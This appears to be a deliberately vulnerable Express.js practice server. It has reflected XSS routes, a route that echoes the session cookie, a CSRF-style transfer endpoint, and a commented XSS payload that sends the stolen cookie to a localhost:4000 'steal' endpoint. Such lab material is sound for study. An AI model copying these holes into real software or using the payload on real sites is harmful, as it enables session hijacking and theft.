const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

// Serve static files (e.g., forms, scripts)
app.use(express.static('public'));

// Simulate a login page
app.get('/login', (req, res) => {
  res.send(`
    <form action="/login" method="POST">
      <label>Username: <input type="text" name="username" /></label>
      <button type="submit">Login</button>
    </form>
  `);
});

// Handle login and set cookies
app.post('/login', (req, res) => {
  const { username } = req.body;
  res.cookie('sessionID', 'abc123', { httpOnly: true, secure: false, sameSite: 'Lax' });
  res.send(`<h1>Welcome, ${username}!</h1><a href='/dashboard'>Go to dashboard</a>`);
});

// Protected dashboard
app.get('/dashboard', (req, res) => {
  if (req.cookies.sessionID) {
    res.send('<h1>Dashboard: Sensitive Information</h1>');
  } else {
    res.redirect('/login');
  }
});


// Protected dashboard
app.get('/profile', (req, res) => {
    if (req.cookies.sessionID) {
      res.send(`<h1>${req.cookies.sessionID}</h1>`);
    } else {
      res.redirect('/login');
    }
  });

// Simulate a CSRF vulnerability
app.get('/transfer', (req, res) => {
  res.send('<h1>Transferring $1000...</h1>');
  console.log(`Transfered 1000 success`);
});

/*
payload
<script>   document.addEventListener('DOMContentLoaded', function() {     fetch('http://localhost:3000/profile', {       method: 'GET',       credentials: 'include'      })     .then(response => response.text())     .then(html => {       const parser = new DOMParser();       const doc = parser.parseFromString(html, 'text/html');       const stolenCookie = doc.querySelector('h1').textContent;       console.log('Stolen Cookie:', stolenCookie);       fetch('http://localhost:4000/steal?cookie=' + encodeURIComponent(stolenCookie));     });   }); </script>

*/
app.post('/xss-test', (req, res) => {
    const userInput = req.body.input;
    res.send(`<h1>You entered: ${userInput}</h1>`);
  });


const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
